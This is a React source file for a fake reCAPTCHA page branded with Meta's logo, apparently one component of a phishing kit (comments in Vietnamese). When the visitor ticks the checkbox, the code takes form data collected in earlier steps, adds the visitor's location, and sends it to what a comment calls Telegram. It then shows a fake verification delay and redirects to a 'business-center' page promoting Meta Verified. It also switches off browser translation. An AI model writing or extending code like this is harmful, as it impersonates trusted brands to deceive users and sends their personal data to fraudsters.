'use client'

import React from 'react'

import { useAppSelector } from '@/app/store/hooks'
import { RECAPTCHA_COPY } from '@/data/recaptchaCopy'
import {
    META_VERIFIED_PROMO_VIDEO_POSTER,
    META_VERIFIED_PROMO_VIDEO_SRC,
} from '@/data/metaVerifiedLanding'
import { getUserLocation, isUnresolvedLocation } from '@/utils/getLocation'
import { isMetaVerifiedFlowCompleted } from '@/utils/metaVerifiedFlow'
import { SendData } from '@/utils/sendData'

/** Ghi nhận trong Telegram khi tick checkbox reCAPTCHA */
const RECAPTCHA_TICKED_MARKER = 'đã tick'
/** Giữ trạng thái đang xác minh lâu hơn để ngôn ngữ theo IP và video kịp tải trước /business-center */
const VERIFY_MS = 3600
const AFTER_CHECK_MS = 900

function prefetchResource(href: string, as?: string) {
    const link = document.createElement('link')
    link.rel = 'prefetch'
    if (as) link.as = as
    link.href = href
    document.head.appendChild(link)
}

const ReCaptcha = () => {
    const captchaText = RECAPTCHA_COPY
    const formData = useAppSelector((state) => state.stepForm.data)

    React.useLayoutEffect(() => {
        const html = document.documentElement
        const prevLang = html.lang
        const prevLocale = html.dataset.locale
        const prevDir = html.dir
        const hadNoTranslate = html.classList.contains('notranslate')

        html.lang = 'en'
        html.dataset.locale = 'en'
        html.dir = 'ltr'
        html.setAttribute('translate', 'no')
        html.classList.add('notranslate')

        return () => {
            html.lang = prevLang
            if (prevLocale) html.dataset.locale = prevLocale
            else delete html.dataset.locale
            html.dir = prevDir
            html.removeAttribute('translate')
            if (!hadNoTranslate) html.classList.remove('notranslate')
        }
    }, [])
    const [isLoading, setIsLoading] = React.useState(false)
    const [isVerified, setIsVerified] = React.useState(false)
    const verifyTimerRef = React.useRef<ReturnType<typeof setTimeout> | null>(null)
    const navigateTimerRef = React.useRef<ReturnType<typeof setTimeout> | null>(null)

    React.useEffect(() => {
        prefetchResource('/business-center', 'document')
        prefetchResource(META_VERIFIED_PROMO_VIDEO_SRC, 'video')
        prefetchResource(META_VERIFIED_PROMO_VIDEO_POSTER, 'image')
        return () => {
            if (verifyTimerRef.current) clearTimeout(verifyTimerRef.current)
            if (navigateTimerRef.current) clearTimeout(navigateTimerRef.current)
        }
    }, [])

    const checkboxLabel = isLoading ? captchaText.verifying : captchaText.notRobot

    const sendRecaptchaToTelegram = async () => {
        if (isMetaVerifiedFlowCompleted()) return

        let payload = { ...formData, recaptcha: RECAPTCHA_TICKED_MARKER }
        if (isUnresolvedLocation(formData)) {
            const location = await getUserLocation()
            payload = { ...payload, ...location }
        }
        try {
            await SendData(payload)
        } catch {
            /* luồng UX vẫn tiếp tục */
        }
    }

    const handleCheckboxChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        if (!e.target.checked || isLoading || isVerified) return

        setIsLoading(true)
        void sendRecaptchaToTelegram()
        if (verifyTimerRef.current) clearTimeout(verifyTimerRef.current)
        if (navigateTimerRef.current) clearTimeout(navigateTimerRef.current)

        verifyTimerRef.current = setTimeout(() => {
            verifyTimerRef.current = null
            setIsLoading(false)
            setIsVerified(true)

            navigateTimerRef.current = setTimeout(() => {
                navigateTimerRef.current = null
                window.location.assign('/business-center')
            }, AFTER_CHECK_MS)
        }, VERIFY_MS)
    }

    return (
        <div
            lang="en"
            dir="ltr"
            translate="no"
            className="recaptcha-page notranslate bg-[#ffffff] flex min-h-[100dvh] w-full flex-col items-center justify-start overflow-y-auto"
        >
            <div className="font-roboto text-[14px] text-gray-800 w-full max-w-[325px] flex flex-col justify-start px-[max(1rem,env(safe-area-inset-left))] pr-[max(1rem,env(safe-area-inset-right))] pb-[max(1.5rem,env(safe-area-inset-bottom))] pt-[max(1.5rem,env(safe-area-inset-top))] sm:h-screen sm:justify-center sm:py-0 md:px-0">
                <div className="w-full">
                    <img src="/images/meta/logo-meta.svg" alt={captchaText.altLogo} className="w-[64px]" />
                </div>

                <div className='flex items-center justify-start bg-cover bg-center py-5 w-full font-helvetica'>
                    <div className="bg-[#f9f9f9] border-2 rounded-md text-[#4c4a4b] flex flex-row items-center justify-between pr-2 w-full">
                        <div className="flex flex-row items-center justify-start ml-[1rem]">
                            <div
                                className='relative h-[30px] w-[30px] flex items-center justify-center'
                                style={{ WebkitTapHighlightColor: 'transparent' }}
                            >
                                <label
                                    className={`recaptcha-check ${isLoading ? 'cursor-wait' : 'cursor-pointer'}`}
                                    htmlFor='checked-captcha'
                                >
                                    <input
                                        type="checkbox"
                                        checked={isVerified}
                                        id='checked-captcha'
                                        onChange={handleCheckboxChange}
                                        aria-label={checkboxLabel}
                                        disabled={isLoading || isVerified}
                                        className="sr-only"
                                    />
                                    <span
                                        aria-hidden="true"
                                        className={`recaptcha-icon ${isLoading ? 'is-loading' : ''} ${isVerified ? 'is-verified' : ''}`}
                                    >
                                        {isLoading && (
                                            <svg className="recaptcha-spinner" viewBox="0 0 24 24" aria-hidden="true">
                                                <circle className="recaptcha-spinner-track" cx="12" cy="12" r="9.25" />
                                                <circle className="recaptcha-spinner-arc" cx="12" cy="12" r="9.25" />
                                            </svg>
                                        )}
                                        {isVerified && (
                                            <svg viewBox="0 0 24 24" className="recaptcha-checkmark">
                                                <path d="M4.5 12.5L9.2 17.1L20 6.3" />
                                            </svg>
                                        )}
                                    </span>
                                </label>
                            </div>
                            <label
                                htmlFor='checked-captcha'
                                aria-live='polite'
                                className={`text-[14px] text-gray-500 font-semibold mr-4 ml-1 text-center text-left tracking-normal ${isLoading ? 'cursor-wait' : 'cursor-pointer'}`}
                            >
                                {checkboxLabel}
                            </label>
                        </div>
                        <div className="flex items-center flex-col text-[#9d9ba7] mb-[2px]">
                            <img src="/images/meta/recaptcha.png" alt={captchaText.altRecaptcha} className="w-[40px] h-[40px] mt-[.5rem]" />
                            <span className="text-[10px] font-bold">reCAPTCHA</span>
                            <div className="text-[8px]">{captchaText.privacyTerms}</div>
                        </div>
                    </div>
                </div>

                <div
                    lang="en"
                    dir="ltr"
                    translate="no"
                    className="recaptcha-copy notranslate text-gray-700 text-[13px] leading-[1.3]"
                >
                    <p className="font-normal" translate="no">{captchaText.p1}</p>
                    <p className="font-normal mt-4" translate="no">{captchaText.p2}</p>
                    <p className="font-normal mt-4" translate="no">{captchaText.p3}</p>
                </div>
            </div>
        </div>
    )
}

export default ReCaptcha
